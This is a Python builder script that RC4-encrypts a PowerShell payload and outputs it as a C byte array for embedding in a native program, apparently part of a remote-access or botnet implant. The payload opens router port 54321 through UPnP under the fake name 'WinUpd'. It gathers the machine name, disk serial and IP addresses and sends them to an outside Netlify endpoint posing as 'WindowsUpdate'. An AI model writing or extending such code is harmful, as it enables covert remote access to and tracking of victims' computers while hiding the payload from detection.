""" Generate RC4-encrypted UPnP PowerShell script for C embedding """
import os

def rc4(key_bytes, data, decode=True):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key_bytes[i % len(key_bytes)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0
    buf = bytearray(data) if isinstance(data, (bytes, bytearray)) else bytearray(data.encode() if decode else data)
    for n in range(len(buf)):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        buf[n] ^= s[(s[i] + s[j]) & 0xFF]
    return bytes(buf)

def to_c_array(name, data):
    lines = [f"static BYTE {name}[] = {{"]
    for i in range(0, len(data), 12):
        chunk = data[i:i+12]
        lines.append("    " + ", ".join(f"0x{b:02X}" for b in chunk) + ",")
    lines.append("};")
    lines.append(f"static int {name}_len = {len(data)};")
    return "\n".join(lines)

# PowerShell script: UPnP + HWID + HTTP POST notification
UPNP_PS = (
    "try{"
    "$r='NOUPNP';$ip='';"
    # UPnP
    "try{$n=New-Object -ComObject HNetCfg.NATUPnP;$c=$n.StaticPortMappingCollection;"
    "if($c){"
    "$lip=((Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias-ne'Loopback'}).IPAddress|Select -First 1);"
    "$c.Add(54321,'TCP',54321,$lip,$true,'WinUpd')|Out-Null;"
    "$ip=$n.GetExternalIPAddress();"
    # UPNP_OK:<wan_ip>|<lan_ip>  — LAN IP included for panel identification
    "if($ip){$r='UPNP_OK:'+$ip+'|'+$lip}}"
    "}catch{}"
    # HWID (ComputerName + VolumeSerial)
    "$hwid='';"
    "try{$hwid=$env:COMPUTERNAME+(Get-WmiObject Win32_LogicalDisk -Filter \"DeviceID='C:'\").VolumeSerialNumber}catch{}"
    # HTTP POST to netlify
    "try{"
    "$o=New-Object -ComObject WinHttp.WinHttpRequest.5.1;"
    "$o.Open('POST','https://maxapi112.netlify.app/api/receive',$false);"
    "$o.SetRequestHeader('Content-Type','application/json');"
    "$b='{\"sender\":\"WindowsUpdate\",\"content\":\"'+$hwid+'|'+$ip+'\",\"type\":\"info\"}';"
    "$o.Send($b)"
    "}catch{}"
    # Output
    "Write-Output($r)"
    "}catch{Write-Output'UPNP_ERR'}"
)

# RC4 key for UPnP script (8 bytes, separate from other keys)
KEY = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
enc = rc4(KEY, UPNP_PS)

print(f"// RC4 key: {', '.join(f'0x{b:02X}' for b in KEY)}")
print(f"#define UPNP_RC4_KEY {{0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE}}")
print(f"#define UPNP_RC4_KEY_LEN 8")
print()
print(to_c_array("g_upnp_ps_enc", enc))
print()
print(f"// Original PowerShell script ({len(UPNP_PS)} bytes):")
print(f"// {UPNP_PS[:80]}...")
